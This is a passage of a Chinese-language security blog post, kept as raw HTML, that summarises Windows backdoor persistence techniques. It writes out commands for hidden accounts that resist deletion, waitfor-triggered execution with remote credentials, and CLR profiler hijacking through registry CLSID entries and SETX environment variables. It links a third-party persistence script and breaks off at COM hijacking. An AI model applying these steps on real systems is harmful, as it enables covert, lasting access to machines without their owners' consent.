Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">test$</code>删除掉</p><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;margin-bottom: 24px;word-break: break-all;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;letter-spacing: 0.75px;text-align: start;"><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;color: inherit;border-radius: 3px;white-space: pre;background: transparent;border-width: 0px;border-style: initial;border-color: initial;word-break: normal;display: inline;max-width: initial;overflow: initial;line-height: inherit;overflow-wrap: normal;">net user test$ /del</code></pre><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">然后再双击导出的注册表文件，然后我们再看一下</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><img class="" data-ratio="0.463884430176565" src="图片/HACK学习呀_2019-10-04_Windows中常见后门持久化方法总结/23_ICgQoXwf2VkwD8fNEuRZGASoDFazsQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouib6iaMO1OKm9cC5ycHsYhYUgUfgic1yyn16MUVm4ornIndsMEICgQoXwf2VkwD8fNEuRZGASoDFazsQ/640?wx_fmt=png'" data-type="png" data-w="1246"  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">net user</code>和计算机管理-用户和组中都查看不到用户了，但是我们可以用<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">net user test$</code>查看用户信息</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">这个时候我们再用<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">net user test$ /del</code>是删除不掉这个用户的，只能通过注册表来删除。</p><h2 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.225;text-rendering: optimizelegibility;font-size:24px;line-height:44px;;padding-bottom: 0em;border-bottom: none;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">waitfor</span></h2><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">关于<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">waitfor</code>手册中是这么解释的：</p><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;margin-bottom: 24px;word-break: break-all;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;letter-spacing: 0.75px;text-align: start;"><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;color: inherit;border-radius: 3px;white-space: pre;background: transparent;border-width: 0px;border-style: initial;border-color: initial;word-break: normal;display: inline;max-width: initial;overflow: initial;line-height: inherit;overflow-wrap: normal;">在系统上发送或等待信号。waitfor可用于跨网络同步计算机。</code></pre><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">waitfor</code>的语法</p><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;margin-bottom: 24px;word-break: break-all;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;letter-spacing: 0.75px;text-align: start;"><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;color: inherit;border-radius: 3px;white-space: pre;background: transparent;border-width: 0px;border-style: initial;border-color: initial;word-break: normal;display: inline;max-width: initial;overflow: initial;line-height: inherit;overflow-wrap: normal;">waitfor [/s &lt;Computer&gt; [/u [&lt;Domain&gt;\]&lt;User&gt; [/p [&lt;Password&gt;]]]] /si &lt;SignalName&gt;<br  />waitfor [/t &lt;Timeout&gt;] &lt;SignalName&gt;</code></pre><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">参数解释：</p><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;margin-bottom: 24px;word-break: break-all;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;letter-spacing: 0.75px;text-align: start;"><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;color: inherit;border-radius: 3px;white-space: pre;background: transparent;border-width: 0px;border-style: initial;border-color: initial;word-break: normal;display: inline;max-width: initial;overflow: initial;line-height: inherit;overflow-wrap: normal;">/s &lt;Computer&gt;  指定远程计算机的名称或IP地址，默认为本地计算机<br  />/u [&lt;Domain&gt;]&lt;user&gt;    使用指定用户帐户的凭据运行脚本。默认是使用当前用户的凭据。<br  />/p &lt;Password&gt;  指定/u参数中指定的用户帐户的密码。<br  />/si            发送指定激活信号。<br  />/t             指定等待信号的秒数。默认为无限期等待。<br  />&lt;SignalName&gt;    指定等待或发送的信号，不区分大小写，长度不能超过225个字符</code></pre><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">关于<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">waitfor</code>更多的信息可以看一下微软提供的手册：链接</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">我们来测试一下看看</p><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;margin-bottom: 24px;word-break: break-all;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;letter-spacing: 0.75px;text-align: start;"><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;color: inherit;border-radius: 3px;white-space: pre;background: transparent;border-width: 0px;border-style: initial;border-color: initial;word-break: normal;display: inline;max-width: initial;overflow: initial;line-height: inherit;overflow-wrap: normal;">waitfor test &amp;&amp; calc 表示接收信号成功后执行计算器<br  /><br  />waitfor /s 192.168.163.143 /u qiyou /p qiyou /si test</code></pre><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">结果如下<br  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><img class="" data-ratio="0.573810994441013" src="图片/HACK学习呀_2019-10-04_Windows中常见后门持久化方法总结/24_Imskq8umDtl68pNbgmSyaicfWB5TOg.gif" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_gif/Uq8Qfeuvouib6iaMO1OKm9cC5ycHsYhYUgIarcGZDibQ8kk90nAn63TOENrTImskq8umDtl68pNbgmSyaicfWB5TOg/640?wx_fmt=gif'" data-type="gif" data-w="1619"  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">但是这样只能执行一次，这对我们后门持久化很不利，所以我们得想办法让它持久化。</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">这里就要借用一下三好师傅的<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">powershell</code>脚本：<span style="color: rgb(255, 104, 39);">https://github.com/3gstudent/Waitfor-Persistence/blob/master/Waitfor-Persistence.ps1</span>，三好师傅的分析：<span style="color: rgb(255, 104, 39);">https://3gstudent.github.io/3gstudent.github.io/Use-Waitfor.exe-to-maintain-persistence/</span></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">执行效果如下：</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><img class="" data-ratio="0.573810994441013" src="图片/HACK学习呀_2019-10-04_Windows中常见后门持久化方法总结/25_4EjUVsJYhyhAibial2boKZaNRk6nLw.gif" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_gif/Uq8Qfeuvouib6iaMO1OKm9cC5ycHsYhYUglg24adlkHTwicfh8SkHJo4H9pvic4EjUVsJYhyhAibial2boKZaNRk6nLw/640?wx_fmt=gif'" data-type="gif" data-w="1619"  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">该方法的优点就是能主动激活，但是缺点也明显就是只能在同一网段才能接收和发送激活信号、服务器重启之后就不行了。</p><h2 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.225;text-rendering: optimizelegibility;font-size:24px;line-height:44px;;padding-bottom: 0em;border-bottom: none;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">CLR</span></h2><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">CLR的简述（来自百度百科）</p><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;margin-bottom: 24px;word-break: break-all;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;letter-spacing: 0.75px;text-align: start;"><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;color: inherit;border-radius: 3px;white-space: pre;background: transparent;border-width: 0px;border-style: initial;border-color: initial;word-break: normal;display: inline;max-width: initial;overflow: initial;line-height: inherit;overflow-wrap: normal;">CLR(公共语言运行库,Common Language Runtime)和Java虚拟机一样也是一个运行时环境，是一个可由多种编程语言使用的运行环境。CLR的核心功能包括：内存管理、程序集加载、安全性、异常处理和线程同步，可由面向CLR的所有语言使用。并保证应用和底层操作系统之间必要的分离。CLR是.NET Framework的主要执行引</code></pre><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">需要注意的是<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">CLR</code>能够劫持系统中全部<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">.net</code>程序，而且系统默认会调用<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">.net</code>程序，从而导致我们的后门自动触发，这是我们后门持久化的一个好的思路，下面来实现一下</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">修改一下注册表，注册表路径：<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">HKEY_CURRENT_USER\Software\Classes\CLSID\</code>，新建子项<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">{11111111-1111-1111-1111-111111111111}</code>（名字随便，只要不与注册表中存在的名称冲突就行），然后再新建子项<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">InProcServer32</code>，新建一个键<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">ThreadingModel</code>，键值为：<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">Apartment</code>，默认的键值为我们<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">dll</code>的路径</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><img class="" data-ratio="0.3661631419939577" src="图片/HACK学习呀_2019-10-04_Windows中常见后门持久化方法总结/26_1cAGoUiczjLhERkY8FdggYGy2jvVbQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouib6iaMO1OKm9cC5ycHsYhYUg8A5kbbS5aAGQiaQ78eZul1M8rK1cAGoUiczjLhERkY8FdggYGy2jvVbQ/640?wx_fmt=png'" data-type="png" data-w="1655"  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">然后在cmd下设置一下：<br  /><strong>PS：要注册为全局变量，不然只能在当前cmd窗口劫持.net程序</strong></p><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;margin-bottom: 24px;word-break: break-all;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;letter-spacing: 0.75px;text-align: start;"><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;color: inherit;border-radius: 3px;white-space: pre;background: transparent;border-width: 0px;border-style: initial;border-color: initial;word-break: normal;display: inline;max-width: initial;overflow: initial;line-height: inherit;overflow-wrap: normal;">SETX COR_ENABLE_PROFILING=1 /M<br  />SETX COR_PROFILER={11111111-1111-1111-1111-111111111111} /M</code></pre><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">然后执行一波，效果如下，可以看到已经成功劫持了<br  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><img class="" data-ratio="0.5528103767757875" src="图片/HACK学习呀_2019-10-04_Windows中常见后门持久化方法总结/27_djUtmsVnnrDkAyWugTHGm3zTzjgrhw.gif" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_gif/Uq8Qfeuvouib6iaMO1OKm9cC5ycHsYhYUgC19WUtzMPVPoE9X4Iibak3zKUdjUtmsVnnrDkAyWugTHGm3zTzjgrhw/640?wx_fmt=gif'" data-type="gif" data-w="1619"  /></p><h2 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.225;text-rendering: optimizelegibility;font-size:24px;line-height:44px;;padding-bottom: 0em;border-bottom: none;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">Hijack CAccPropServicesClass and MMDeviceEnumerator</span></h2><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">什么是<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">COM</code>（来自<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">WIKI</code>）</p><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;margin-bottom: 24px;word-break: break-all;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;letter-spacing: 0.75px;text-align: start;"><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;color: inherit;border-radius: 3px;white-space: pre;background: 